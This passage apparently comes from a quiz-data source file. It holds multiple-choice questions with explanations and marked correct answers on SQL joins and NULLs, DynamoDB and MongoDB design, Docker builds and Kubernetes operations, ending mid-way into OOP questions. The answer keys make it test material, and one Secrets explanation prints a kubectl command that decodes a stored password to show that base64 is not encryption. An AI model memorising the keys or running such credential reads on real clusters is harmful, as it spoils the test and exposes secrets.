        question: `The intent is to list **all** customers, along with any of their *shipped* orders (customers with no shipped orders should still appear, with \`NULL\` order IDs). Why does this query drop customers, and how do you fix it?

\`\`\`sql
SELECT c.id, c.name, o.id AS order_id
FROM customers c
LEFT JOIN orders o ON o.customer_id = c.id
WHERE o.status = 'shipped';
\`\`\``,
        explanation: `A \`LEFT JOIN\` keeps every customer row. When there's no matching order, the \`o.*\` columns are filled with \`NULL\`. But \`WHERE\` is evaluated **after** the join, and \`NULL = 'shipped'\` evaluates to **UNKNOWN**, which \`WHERE\` treats as false.

So every customer without a shipped order is filtered out. The query **silently behaves like an \`INNER JOIN\`**.

Fix: put the condition on the right-hand table into the **\`ON\` clause**, so it restricts which orders are joined rather than which result rows survive:

\`\`\`sql
SELECT c.id, c.name, o.id AS order_id
FROM customers c
LEFT JOIN orders o
  ON o.customer_id = c.id AND o.status = 'shipped';
\`\`\`

Rule of thumb: in an outer join, filters on the *optional* side belong in \`ON\`. Filters on the *preserved* side can go in \`WHERE\`.`,
        answers: [
          {
            answer: `The \`WHERE o.status = 'shipped'\` filter discards the \`NULL\`-extended rows, turning the LEFT JOIN into an inner join. Move the condition into the \`ON\` clause.`,
            isCorrect: true,
          },
          {
            answer: `\`LEFT JOIN\` should be \`RIGHT JOIN\`. The preserved table must be listed second.`,
            isCorrect: false,
          },
          {
            answer: `The query is correct. Customers only drop out if \`orders.customer_id\` has no foreign key constraint.`,
            isCorrect: false,
          },
          {
            answer: `Add \`GROUP BY c.id\`. Without it, the database deduplicates customers that have no orders.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `The \`discontinued\` table has 3 rows: \`product_id\` values \`7\`, \`12\`, and \`NULL\`. The \`products\` table has 1,000 rows with IDs 1–1000. How many rows does this query return?

\`\`\`sql
SELECT name
FROM products
WHERE id NOT IN (SELECT product_id FROM discontinued);
\`\`\``,
        explanation: `SQL uses **three-valued logic** (TRUE, FALSE, UNKNOWN). \`x NOT IN (a, b, c)\` is equivalent to \`x <> a AND x <> b AND x <> c\`.

For product 5, that's \`5 <> 7 AND 5 <> 12 AND 5 <> NULL\`, which is \`TRUE AND TRUE AND UNKNOWN\`. That evaluates to **UNKNOWN**, and \`WHERE\` keeps only rows that are TRUE.

Because the subquery contains a \`NULL\`, **no row can ever satisfy \`NOT IN\`**, and the query returns **0 rows**. This bug often appears in production when a nullable column gets its first \`NULL\`.

Fixes:

\`\`\`sql
-- Preferred: NOT EXISTS is NULL-safe and usually planned as an anti-join
SELECT p.name FROM products p
WHERE NOT EXISTS (
  SELECT 1 FROM discontinued d WHERE d.product_id = p.id
);

-- Or filter the NULLs out
WHERE id NOT IN (SELECT product_id FROM discontinued WHERE product_id IS NOT NULL)
\`\`\``,
        answers: [
          {
            answer: `0 rows. Comparing any ID with the \`NULL\` yields UNKNOWN, so \`NOT IN\` is never TRUE. Use \`NOT EXISTS\`, or filter out \`NULL\`s in the subquery.`,
            isCorrect: true,
          },
          {
            answer: `998 rows. \`NULL\` values in a subquery are ignored by \`NOT IN\`.`,
            isCorrect: false,
          },
          {
            answer: `997 rows. The \`NULL\` is treated as a match for one arbitrary product.`,
            isCorrect: false,
          },
          {
            answer: `1,000 rows. \`NOT IN\` short-circuits to TRUE as soon as it encounters a \`NULL\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `An IoT platform stores sensor readings in DynamoDB with **partition key = event date** (e.g. \`2026-11-05\`) and **sort key = timestamp**. Thousands of devices write continuously, and writes are being throttled even though the table's total provisioned capacity is far from exhausted. What's the cause, and what's a better key design?`,
        explanation: `DynamoDB distributes data and throughput across physical partitions by hashing the **partition key**. Each partition has hard throughput limits (about 1,000 WCU and 3,000 RCU per second).

With the date as the partition key, **all writes for "today" go to the same key**, and so to a single partition. That's a **hot partition**: it hits its per-partition limit and throttles, while capacity on other partitions sits unused. Adaptive capacity can rebalance somewhat, but it can't split a single partition key's traffic beyond those limits.

Better designs spread writes across many keys:
- **Use a high-cardinality key that matches the access pattern**, e.g. \`PK = deviceId\`, \`SK = timestamp\`. This is ideal when queries are "readings for device X in time range Y".
- **Write sharding**: \`PK = 2026-11-05#<0..N-1>\` (random or hash-based suffix). Writes spread across N keys, and reads by date fan out to N queries and merge the results.

In NoSQL key-value and wide-column stores, keys are designed **from the access patterns**, with even distribution as a primary goal.`,
        answers: [
          {
            answer: `A hot partition: every write for the current day shares one partition key, so it hits the per-partition throughput limit. Use a high-cardinality key such as \`deviceId\`, or add a shard suffix to the date key (\`date#N\`) to spread writes.`,
            isCorrect: true,
          },
          {
            answer: `The sort key is the problem. DynamoDB hashes sort keys to choose partitions, and timestamps are sequential, so they collide.`,
            isCorrect: false,
          },
          {
            answer: `DynamoDB throttles any table with more than one write per second per item. Batch writes with \`BatchWriteItem\` to fix it.`,
            isCorrect: false,
          },
          {
            answer: `Global secondary indexes are missing. Adding a GSI on \`timestamp\` multiplies the table's write capacity.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A MongoDB collection receives this query constantly:

\`\`\`javascript
db.orders
  .find({ status: "shipped", total: { $gt: 100 } })
  .sort({ createdAt: -1 });
\`\`\`

Which compound index best supports it?`,
        explanation: `For compound indexes, MongoDB recommends the **ESR rule**: order fields by **E**quality, then **S**ort, then **R**ange.

\`{ status: 1, createdAt: -1, total: 1 }\`:
- **Equality** (\`status\`) first narrows the index to one contiguous section.
- **Sort** (\`createdAt\`) next means entries within that section are *already in the requested order*, so MongoDB can walk the index and avoid an in-memory \`SORT\` stage (which is slow and has a memory limit).
- **Range** (\`total\`) last is still checked against the index keys, filtering without fetching documents that don't match.

Putting the range field before the sort field (\`{ status, total, createdAt }\`) means the results come out ordered by \`total\`. MongoDB then has to do a **blocking in-memory sort** on \`createdAt\`.

Separate single-field indexes rarely help, since index intersection is seldom chosen by the planner. Leading with \`createdAt\` makes the equality match far less selective.

Verify the plan with \`.explain("executionStats")\`: you want \`IXSCAN\` and no \`SORT\` stage.`,
        answers: [
          {
            answer: `\`{ status: 1, createdAt: -1, total: 1 }\`. Equality, then Sort, then Range (the ESR rule), so results come out of the index already sorted with no in-memory sort.`,
            isCorrect: true,
          },
          {
            answer: `\`{ status: 1, total: 1, createdAt: -1 }\`. Filter fields should always come before sort fields.`,
            isCorrect: false,
          },
          {
            answer: `\`{ createdAt: -1, status: 1, total: 1 }\`. The sort field must lead the index for MongoDB to use it for sorting.`,
            isCorrect: false,
          },
          {
            answer: `Three single-field indexes on \`status\`, \`total\`, and \`createdAt\`. MongoDB intersects them, which is more flexible than a compound index.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "Docker & Kubernetes",
    questions: [
      {
        question: `The following Dockerfile builds a Node.js API. A developer notices that every source code change — even a one-line edit in \`src/index.ts\` — causes \`npm ci\` to re-run, adding 90 seconds to every build. What is the root cause, and what change fixes it?

\`\`\`dockerfile
FROM node:22-alpine
WORKDIR /app
COPY . .
RUN npm ci
RUN npm run build
CMD ["node", "dist/index.js"]
\`\`\``,
        explanation: `Docker builds images layer by layer and **caches each layer**. A layer is invalidated — and all subsequent layers rebuild from scratch — whenever its instruction or the files it depends on change. In this Dockerfile, \`COPY . .\` copies the entire source tree (including \`src/\`, \`package.json\`, \`package-lock.json\`, and everything else) into one layer. Any file change invalidates that layer, forcing \`npm ci\` to re-run every time.

The fix is to copy only the dependency manifests first, install dependencies, then copy the rest of the source:

\`\`\`dockerfile
FROM node:22-alpine
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build
CMD ["node", "dist/index.js"]
\`\`\`

Now the \`npm ci\` layer is only invalidated when \`package.json\` or \`package-lock.json\` actually change. Source-only edits hit the cache for the install step and only rebuild the \`COPY . .\` and \`npm run build\` layers — reducing incremental build time from 90 seconds to a few seconds. This is one of the highest-impact Dockerfile optimizations for development velocity.`,
        answers: [
          {
            answer: "`COPY . .` copies all source files before `npm ci`, so any file change invalidates the install layer. Fix: copy only `package.json`/`package-lock.json`, run `npm ci`, then copy the full source.",
            isCorrect: true,
          },
          {
            answer: "The `node:22-alpine` base image doesn't support layer caching. Switching to `node:22` enables it.",
            isCorrect: false,
          },
          {
            answer: "`npm ci` always deletes and reinstalls `node_modules` regardless of cache. Replace it with `npm install --prefer-offline` to use the cache.",
            isCorrect: false,
          },
          {
            answer: "Merging `RUN npm ci` and `RUN npm run build` into a single `RUN` instruction with `&&` would eliminate the cache invalidation.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Kubernetes Deployment has both a **liveness probe** and a **readiness probe** configured. The application takes 20 seconds to start up, but the liveness probe begins checking at second 5 with a \`failureThreshold\` of 3 and \`periodSeconds\` of 5. What happens, and how should the probes be correctly configured?`,
        explanation: `**Liveness probe failure** signals to Kubernetes that the container is stuck or unrecoverable — Kubernetes kills and restarts it per the pod's \`restartPolicy\`. With a \`failureThreshold\` of 3 and \`periodSeconds\` of 5, the liveness probe declares the container dead at second 20 (5s start + 3×5s). Since the app needs exactly 20 seconds to start, the container gets killed just as it would be finishing startup, creating a **crash loop**.

**Readiness probe failure** is gentler: Kubernetes removes the pod from the Service's endpoint list (stopping new traffic), but does not restart the container. This is the appropriate behavior during startup.

The correct solution uses a **\`startupProbe\`**: while the startup probe is failing, liveness and readiness probes are completely suspended. Only after the startup probe succeeds do the other probes activate. Configure it with a generous budget:

\`\`\`yaml
startupProbe:
  httpGet:
    path: /healthz
    port: 8080
  failureThreshold: 30
  periodSeconds: 2   # 60-second startup budget
livenessProbe:
  httpGet:
    path: /healthz
    port: 8080
  periodSeconds: 10
readinessProbe:
  httpGet:
    path: /ready
    port: 8080
  periodSeconds: 5
\`\`\`

This gives the app a 60-second startup window without affecting the tighter runtime health checking cadence.`,
        answers: [
          {
            answer: "Kubernetes kills the container in a crash loop before it finishes starting. Fix: add a `startupProbe` with a generous `failureThreshold` to suspend liveness/readiness checking during startup.",
            isCorrect: true,
          },
          {
            answer: "Kubernetes removes the pod from Service endpoints but does not restart it, so the app eventually finishes starting and traffic resumes automatically.",
            isCorrect: false,
          },
          {
            answer: "Both probes are suspended until the container's main process signals readiness via a lifecycle hook, so a 20-second startup has no effect.",
            isCorrect: false,
          },
          {
            answer: "Kubernetes scales up a replacement pod and terminates the slow pod only after the replacement passes its readiness probe.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `You need to deploy a 3-node MongoDB replica set on Kubernetes. Each node requires:
- A stable, predictable DNS name (\`mongo-0\`, \`mongo-1\`, \`mongo-2\`)
- Its own dedicated persistent volume that survives pod restarts and rescheduling

Which Kubernetes workload resource should you use, and why is a \`Deployment\` insufficient for this use case?`,
        explanation: `Use a **StatefulSet**. StatefulSets are designed specifically for stateful workloads that require stable identities and dedicated storage:

1. **Stable pod names**: pods are named \`<statefulset>-0\`, \`<statefulset>-1\`, etc. and are recreated with the same name after restarts. Combined with a Headless Service, each pod gets a DNS entry like \`mongo-0.mongo.default.svc.cluster.local\`. MongoDB replica set configuration requires knowing each member's address in advance — these stable names make that possible.

2. **Per-pod PersistentVolumeClaims**: the \`volumeClaimTemplates\` field creates a separate PVC for each pod (\`data-mongo-0\`, \`data-mongo-1\`, etc.). When \`mongo-0\` is rescheduled to a different node, it reattaches to its original PVC and retains all data.

**Why a Deployment fails here:**
- Deployment pods are **stateless and interchangeable** — they share no stable identity. Pod names include random suffixes (\`mongo-abc12\`) and change on restart.
- All replicas in a Deployment share a single PVC if one is mounted, or each gets a new anonymous PVC on reschedule (losing data).
- There's no guaranteed ordering for startup/shutdown — MongoDB replica set initialization requires sequential, ordered startup.

StatefulSets also provide ordered rolling updates and graceful ordered termination, both important for maintaining replica set quorum during upgrades.`,
        answers: [
          {
            answer: "Use a **StatefulSet**. It provides stable pod names (`mongo-0`, `mongo-1`, `mongo-2`), per-pod PVCs via `volumeClaimTemplates`, and ordered startup/shutdown. A Deployment's pods are anonymous and interchangeable — they have no stable identity and share or lose storage on reschedule.",
            isCorrect: true,
          },
          {
            answer: "Use a **Deployment** with a `ReadWriteMany` PVC shared across all replicas — MongoDB handles data distribution internally so dedicated volumes are unnecessary.",
            isCorrect: false,
          },
          {
            answer: "Use a **DaemonSet** — it ensures exactly one MongoDB pod per node, providing the physical isolation and stable node-based addressing the replica set needs.",
            isCorrect: false,
          },
          {
            answer: "Use a **Deployment** with pod affinity rules and `nodeSelector` labels — this pins each pod to a specific node, simulating stable identity without the overhead of a StatefulSet.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The final production image built from this Dockerfile is 1.1 GB and contains the full TypeScript toolchain, dev dependencies, and source \`.ts\` files. What technique reduces it to a lean runtime image, and roughly what should the production stage contain?

\`\`\`dockerfile
FROM node:22
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build          # tsc -> dist/
CMD ["node", "dist/index.js"]
\`\`\``,
        explanation: `The problem: a single-stage build ships **everything** used to *build* the app in the image that *runs* it — the full \`node:22\` image (~1 GB), all \`devDependencies\` (TypeScript, type definitions, test tooling), and the original \`.ts\` source. None of that is needed at runtime; only the compiled \`dist/\` and production \`node_modules\` are.

The technique is a **multi-stage build**. Use a \`build\` stage with the full toolchain to compile, then a separate slim \`runtime\` stage that copies *only* the compiled output and production dependencies:

\`\`\`dockerfile
# ---- build stage ----
FROM node:22 AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# ---- runtime stage ----
FROM node:22-alpine AS runtime
WORKDIR /app
ENV NODE_ENV=production
COPY package*.json ./
RUN npm ci --omit=dev          # production deps only
COPY --from=build /app/dist ./dist
CMD ["node", "dist/index.js"]
\`\`\`

Key points:
- The final image is based on a **smaller runtime base** (\`node:22-alpine\`, or even a distroless image) and never contains TypeScript, dev dependencies, or source \`.ts\` files.
- \`COPY --from=build\` pulls only the artifacts you name across the stage boundary; the entire build stage (and its bloat) is discarded.
- \`npm ci --omit=dev\` (or copying a pruned \`node_modules\`) keeps only production dependencies.

This typically cuts a Node/TypeScript image from ~1 GB to ~150–200 MB, reducing pull time, attack surface, and cost.`,
        answers: [
          {
            answer: "Use a multi-stage build: compile in a full-toolchain `build` stage, then `COPY --from=build` only `dist/` into a slim runtime stage (e.g. `node:22-alpine`) that installs production-only deps with `npm ci --omit=dev`.",
            isCorrect: true,
          },
          {
            answer: "Add `RUN npm prune --production` as the last line; this rewrites the earlier layers in place and removes the base image bloat and source files.",
            isCorrect: false,
          },
          {
            answer: "Set `.dockerignore` to exclude `node_modules`; this alone shrinks the final image to a lean runtime because dependencies are then downloaded at container start.",
            isCorrect: false,
          },
          {
            answer: "Switch the single `FROM node:22` to `FROM node:22-slim` — the toolchain and dev dependencies are automatically stripped from slim images at build time.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Kubernetes cluster is under memory pressure and the kubelet must evict pods. Three pods run on the node with these resource specs. Which pod is evicted **first**, and what QoS classes do these specs produce?

\`\`\`yaml
# Pod A
resources:
  requests: { cpu: "250m", memory: "256Mi" }
  limits:   { cpu: "250m", memory: "256Mi" }

# Pod B
resources:
  requests: { cpu: "250m", memory: "256Mi" }
  limits:   { cpu: "500m", memory: "512Mi" }

# Pod C
# (no resources block at all)
\`\`\``,
        explanation: `Kubernetes assigns each pod a **Quality of Service (QoS) class** based on its requests and limits, and uses that class to decide eviction order under node pressure:

- **Pod A → \`Guaranteed\`**: every container sets \`requests == limits\` for *both* CPU and memory. These pods are the last to be evicted.
- **Pod B → \`Burstable\`**: it sets requests, but limits differ from requests (or not all resources are constrained). Evicted after \`BestEffort\` but before \`Guaranteed\`.
- **Pod C → \`BestEffort\`**: no requests or limits at all. These are the **first evicted** under resource pressure.

So **Pod C is evicted first.** Under memory pressure the kubelet ranks candidates by QoS class (\`BestEffort\` → \`Burstable\` → \`Guaranteed\`) and, within a class, by how much a pod exceeds its memory request. \`BestEffort\` pods have no memory request, so they're the top eviction candidates.

Practical guidance: set requests and limits deliberately. \`Guaranteed\` pods get the strongest protection and predictable performance; \`BestEffort\` pods are cheap to schedule but the first sacrificed. For critical workloads, set \`requests == limits\` to land in \`Guaranteed\`. Note also that exceeding a *memory limit* gets a container OOM-killed regardless of QoS — QoS governs *eviction under node pressure*, which is a separate mechanism.`,
        answers: [
          {
            answer: "Pod C is evicted first. Pod A is `Guaranteed` (requests == limits for CPU and memory), Pod B is `Burstable` (requests set, limits differ), and Pod C is `BestEffort` (no requests/limits) — evicted first under node memory pressure.",
            isCorrect: true,
          },
          {
            answer: "Pod A is evicted first because its tight `limits` leave no headroom; Pods B and C are `Burstable` and can grow, so the scheduler protects them.",
            isCorrect: false,
          },
          {
            answer: "Pod B is evicted first because a mismatch between requests and limits makes it `BestEffort`; A and C are both `Guaranteed`.",
            isCorrect: false,
          },
          {
            answer: "Eviction order is random across all three — Kubernetes does not use resource specs to prioritize evictions, only pod age.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Node.js container built from this Dockerfile always takes the full grace period to stop (10s for \`docker stop\`, 30s in Kubernetes) and is then force-killed. The app's \`process.on("SIGTERM")\` handler never runs. Why?

\`\`\`dockerfile
FROM node:22-alpine
WORKDIR /app
COPY . .
RUN npm ci && npm run build
CMD npm start
\`\`\``,
        explanation: `\`CMD npm start\` is the **shell form**, so Docker runs it as \`/bin/sh -c "npm start"\`. That makes **\`sh\` PID 1**, with \`npm\` as its child and \`node\` as a grandchild.

When the container is stopped, SIGTERM is delivered **only to PID 1**. \`sh\` doesn't forward signals to its children (and \`npm\` historically hasn't reliably either). Your Node process never sees SIGTERM. After the timeout, everything is SIGKILLed: no graceful shutdown, and in-flight requests are dropped.

There's a second subtlety: the Linux kernel gives **PID 1** no default signal handlers. Even \`node\` running as PID 1 ignores SIGTERM unless it registers a handler.

Fixes:
- Use the **exec form** so \`node\` itself is PID 1 and receives signals directly:
  \`\`\`dockerfile
  CMD ["node", "dist/server.js"]
  \`\`\`
- Optionally add a minimal init (\`docker run --init\`, or \`tini\` as the \`ENTRYPOINT\`). It forwards signals and reaps zombie processes.`,
        answers: [
          {
            answer: `The shell-form \`CMD\` makes \`/bin/sh\` PID 1, and it doesn't forward SIGTERM to \`npm\`/\`node\`. Use the exec form \`CMD ["node", "dist/server.js"]\` (optionally with \`--init\`/tini) so Node receives the signal.`,
            isCorrect: true,
          },
          {
            answer: `Alpine images don't support POSIX signals. Switch to a Debian-based \`node\` image.`,
            isCorrect: false,
          },
          {
            answer: `\`docker stop\` sends SIGKILL by default. Add \`STOPSIGNAL SIGTERM\` to the Dockerfile to fix it.`,
            isCorrect: false,
          },
          {
            answer: `\`npm ci\` installs dev dependencies that intercept signals. Use \`npm ci --omit=dev\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A team runs six HTTP microservices on Kubernetes, each exposed with \`type: LoadBalancer\`. That creates six cloud load balancers, six public IPs, and six TLS certificates to manage. They want a single entry point that routes \`api.example.com/orders\` and \`api.example.com/users\` (and others) to the right service, with TLS terminated in one place. What's the idiomatic approach?`,
        explanation: `An **Ingress** (or its successor, the **Gateway API**) defines **L7 HTTP(S) routing rules**: host- and path-based routing to backend Services, plus TLS termination. An **Ingress controller** implements those rules (ingress-nginx, Traefik, HAProxy, or a cloud controller like AWS ALB). The controller itself is usually exposed through a *single* \`LoadBalancer\` Service.

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: api
spec:
  tls:
    - hosts: [api.example.com]
      secretName: api-tls
  rules:
    - host: api.example.com
      http:
        paths:
          - path: /orders
            pathType: Prefix
            backend: { service: { name: orders, port: { number: 80 } } }
          - path: /users
            pathType: Prefix
            backend: { service: { name: users, port: { number: 80 } } }
\`\`\`

The backend services become \`ClusterIP\` (internal only).

Note that an Ingress resource does nothing without a controller installed. **NodePort** exposes a high port on every node with no HTTP routing. **Headless** services (\`clusterIP: None\`) only change DNS to return pod IPs. **ExternalName** maps a service to an external DNS name.`,
        answers: [
          {
            answer: `Change the services to \`ClusterIP\` and define an Ingress (or Gateway API \`HTTPRoute\`) with host/path rules and TLS, served by an Ingress controller behind a single load balancer.`,
            isCorrect: true,
          },
          {
            answer: `Change all six services to \`NodePort\` and point DNS at any node. NodePort performs path-based routing automatically.`,
            isCorrect: false,
          },
          {
            answer: `Make the services headless (\`clusterIP: None\`), so Kubernetes DNS load-balances HTTP paths across them.`,
            isCorrect: false,
          },
          {
            answer: `Use \`type: ExternalName\` services, which merge multiple services behind one external IP.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A teammate argues that storing a database password in a Kubernetes \`Secret\` (instead of a \`ConfigMap\`) means it's encrypted and safe. What's accurate about default Kubernetes Secrets?`,
        explanation: `By default, Secret values are only **base64-encoded**. That's an encoding, not encryption, and anyone who can read the object can decode it instantly (\`kubectl get secret db -o jsonpath='{.data.password}' | base64 -d\`).

Without extra configuration, Secrets are also stored **unencrypted in etcd**. Anyone with etcd access, or etcd backups, can read them.

What Secrets *do* provide over ConfigMaps: a distinct resource type you can lock down separately with RBAC, the option of encryption at rest, and handling that keeps them out of some logs and descriptions. Secrets mounted as volumes are kept in tmpfs (memory) on nodes.

Hardening steps:
- Enable **encryption at rest** for Secrets (an \`EncryptionConfiguration\` with a **KMS provider**). Managed clusters often offer this as a setting.
- Apply **least-privilege RBAC**. \`get\`/\`list\`/\`watch\` on Secrets in a namespace effectively grants all of them, and so does the ability to create pods in that namespace.
- Consider an external secret manager (Vault, AWS Secrets Manager, GCP Secret Manager) via External Secrets Operator or the CSI Secrets Store driver.
- Don't commit Secret manifests to Git unless they're encrypted (SOPS, Sealed Secrets).`,
        answers: [
          {
            answer: `They're only base64-encoded and, by default, stored unencrypted in etcd. Protect them by enabling encryption at rest (ideally with KMS), tight RBAC, and optionally an external secret manager.`,
            isCorrect: true,
          },
          {
            answer: `They're encrypted with AES-256 by default using a key unique to each namespace, so they're safe to commit to Git.`,
            isCorrect: false,
          },
          {
            answer: `Base64 encoding is a one-way hash, so even cluster admins can't recover the original value.`,
            isCorrect: false,
          },
          {
            answer: `Secrets and ConfigMaps are stored identically, so there's no reason to prefer Secrets for sensitive data.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A HorizontalPodAutoscaler targets 70% CPU utilization, but \`kubectl get hpa\` shows \`TARGETS: <unknown>/70%\` and the deployment never scales, even under heavy load. metrics-server is installed and \`kubectl top pods\` works. What's the most likely cause?

\`\`\`yaml
containers:
  - name: api
    image: myorg/api:1.4.2
    # no resources block
\`\`\``,
        explanation: `For \`Utilization\` targets, the HPA computes **current usage as a percentage of the container's resource *requests***:

\`\`\`
utilization = current CPU usage / requested CPU
\`\`\`

With **no CPU request defined**, there's nothing to divide by. The HPA can't calculate utilization, reports \`<unknown>\`, and won't scale. \`kubectl describe hpa\` typically shows an event like *"missing request for cpu"*.

Fix: set CPU requests on every container in the pod (including sidecars):

\`\`\`yaml
resources:
  requests:
    cpu: 250m
    memory: 256Mi
  limits:
    memory: 512Mi
\`\`\`

Other causes of \`<unknown>\` include metrics-server being missing or unhealthy (ruled out here, since \`kubectl top\` works) and pods that haven't reported metrics yet just after startup.

Requests also matter well beyond the HPA: the scheduler uses them for pod placement, and they determine the pod's QoS class.`,
        answers: [
          {
            answer: `The containers don't define CPU \`resources.requests\`. Utilization-based HPA computes usage as a percentage of the request, so with no request it can't compute a value.`,
            isCorrect: true,
          },
          {
            answer: `HPA only works with \`kind: StatefulSet\`, not Deployments.`,
            isCorrect: false,
          },
          {
            answer: `The target must be expressed in millicores (\`700m\`) rather than a percentage. Percentages only work for memory.`,
            isCorrect: false,
          },
          {
            answer: `The HPA needs \`minReplicas\` to be at least 3 before it starts reporting metrics.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Deployment with 4 replicas uses this update strategy. A new version is rolled out, but its image has a bug that makes its readiness probe fail forever. What happens?

\`\`\`yaml
spec:
  replicas: 4
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
\`\`\``,
        explanation: `\`maxUnavailable: 0\` means the rollout may never take the number of **available (Ready)** pods below the desired 4. \`maxSurge: 1\` allows at most **one extra** pod above 4 during the rollout.

The controller therefore:
1. Creates **one** new-version pod (5 pods total).
2. Waits for it to become **Ready** before terminating an old pod.

Because the new pod never passes its readiness probe, step 2 never happens. The **rollout stalls**: 4 old pods keep serving all traffic, and the one broken new pod receives none, since unready pods are removed from Service endpoints.

After \`progressDeadlineSeconds\` (600s by default), the Deployment's \`Progressing\` condition becomes \`False\` with reason \`ProgressDeadlineExceeded\`. Kubernetes **doesn't roll back automatically**, but CI/CD tooling can detect the failure (\`kubectl rollout status\` exits non-zero), and you can run \`kubectl rollout undo\`.

This combination is a safe, zero-downtime strategy, at the cost of temporarily needing capacity for one extra pod.`,
        answers: [
          {
            answer: `One new pod is created (5 total) and never becomes Ready, so no old pods are terminated. The rollout stalls with all 4 old pods still serving traffic until \`progressDeadlineSeconds\` marks it failed; Kubernetes doesn't roll back automatically.`,
            isCorrect: true,
          },
          {
            answer: `All 4 old pods are replaced immediately, because \`maxUnavailable: 0\` disables availability checks during rollouts.`,
            isCorrect: false,
          },
          {
            answer: `Kubernetes automatically rolls back to the previous ReplicaSet as soon as the first new pod fails its readiness probe.`,
            isCorrect: false,
          },
          {
            answer: `The new pod is restarted in a loop by the readiness probe, and traffic alternates between old and new pods.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "OOP & Functional Programming",
    questions: [
      {
        question: `What does the following functional TypeScript code output?

\`\`\`typescript
const pipe = <T>(...fns: Array<(arg: T) => T>) => (x: T): T =>
  fns.reduce((v, f) => f(v), x);

const double  = (n: number) => n * 2;
const addTen  = (n: number) => n + 10;
const square  = (n: number) => n * n;

const transform = pipe(double, addTen, square);
console.log(transform(3));
\`\`\`

And how does \`pipe\` differ from \`compose\`?`,
        explanation: `\`pipe\` applies functions **left-to-right** using \`reduce\`, starting with the initial value \`x\`:

1. \`double(3)\` → \`6\`
2. \`addTen(6)\` → \`16\`
3. \`square(16)\` → \`256\`

Output: **\`256\`**

\`compose\` applies functions in the opposite order — **right-to-left** (like mathematical function composition: \`f∘g∘h(x) = f(g(h(x)))\`). The equivalent \`compose(double, addTen, square)(3)\` would compute \`square(3)=9 → addTen(9)=19 → double(19)=38\`.

In practice, \`pipe\` is more readable because the data flows in the same direction as your eye reads the code. Libraries like Ramda and fp-ts provide both. TypeScript's strict generic inference makes typing \`pipe\` for heterogeneous function chains (where output types differ between steps) require function overloads — the version above works only when all functions share the same type \`T\`.`,
        answers: [
          {
            answer: "`256`. `pipe` applies functions left-to-right: `double(3)=6 → addTen(6)=16 → square(16)=256`. `compose` applies right-to-left, the opposite order.",
            isCorrect: true,
          },
          {
            answer: "`38`. `pipe` applies functions right-to-left: `square(3)=9 → addTen(9)=19 → double(19)=38`.",
            isCorrect: false,
          },
          {
            answer: "`676`. `pipe` sorts the functions by arity before applying them, so `addTen` runs first: `addTen(3)=13 → double(13)=26 → square(26)=676`.",
            isCorrect: false,
          },
          {
            answer: "`36`. `pipe` with `reduce` applies only the first two functions; the third is used as the accumulator's initial value.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The following TypeScript code demonstrates a classic OOP design flaw. What does \`testArea\` print for a \`Square\`, and which SOLID principle does the \`Square extends Rectangle\` hierarchy violate?

\`\`\`typescript
class Rectangle {
  constructor(protected width: number, protected height: number) {}
  setWidth(w: number)  { this.width = w; }
  setHeight(h: number) { this.height = h; }
  area() { return this.width * this.height; }
}

class Square extends Rectangle {
  setWidth(w: number)  { this.width = w;  this.height = w; }
  setHeight(h: number) { this.width = h;  this.height = h; }
}

function testArea(rect: Rectangle) {
  rect.setWidth(4);
  rect.setHeight(5);
  console.log(rect.area());
}

testArea(new Rectangle(0, 0)); // 20
testArea(new Square(0, 0));    // ???
\`\`\``,
        explanation: `**Output for \`Square\`: \`25\`.**

\`setWidth(4)\` sets both dimensions to 4. Then \`setHeight(5)\` overwrites both dimensions to 5 — the earlier width assignment is silently discarded. Area = 5 × 5 = **25**, not the expected 20.

This violates the **Liskov Substitution Principle (LSP)** — the "L" in SOLID. LSP states: *if S is a subtype of T, then objects of type T may be replaced with objects of type S without altering any of the desirable properties of the program*. Here, substituting a \`Square\` for a \`Rectangle\` breaks the implicit invariant that \`setWidth\` and \`setHeight\` operate independently.

The real-world lesson: **inheritance should model "is-a" in terms of behavior, not just shape**. A square *is* a rectangle geometrically, but it does not *behave* like a \`Rectangle\` in this API. The fix is to avoid the inheritance and instead use separate classes (possibly sharing an interface like \`Shape\`) or make \`Rectangle\` and \`Square\` both immutable value objects where side-effecting setters don't exist.`,
        answers: [
          {
            answer: "`25`. `setHeight(5)` overwrites the width set by `setWidth(4)`, so both dimensions end up as 5. This violates the **Liskov Substitution Principle** — a Square cannot be substituted for a Rectangle without breaking the program's expected behavior.",
            isCorrect: true,
          },
          {
            answer: "`20`. Square inherits Rectangle's setters and behaves identically, so testArea produces the same result for both. No SOLID principle is violated.",
            isCorrect: false,
          },
          {
            answer: "`16`. Square forces width = height throughout, so after both setters run, each dimension is 4 (the last consistent state). This violates the Open/Closed Principle.",
            isCorrect: false,
          },
          {
            answer: "A TypeError is thrown because TypeScript prevents instantiating a subclass that overrides parent methods with different behavior at runtime.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `This code models a coffee order using deep inheritance. Adding "iced" and "extra shot" as new inheritable options is causing a class explosion (\`IcedLatteWithExtraShot\`, \`IcedMochaWithSoy\`, …). Which design approach solves this, and what principle does it embody?

\`\`\`typescript
class Coffee { cost() { return 2.0; } }
class Latte extends Coffee { cost() { return super.cost() + 0.5; } }
class LatteWithSoy extends Latte { cost() { return super.cost() + 0.4; } }
class LatteWithSoyAndExtraShot extends LatteWithSoy {
  cost() { return super.cost() + 0.6; }
}
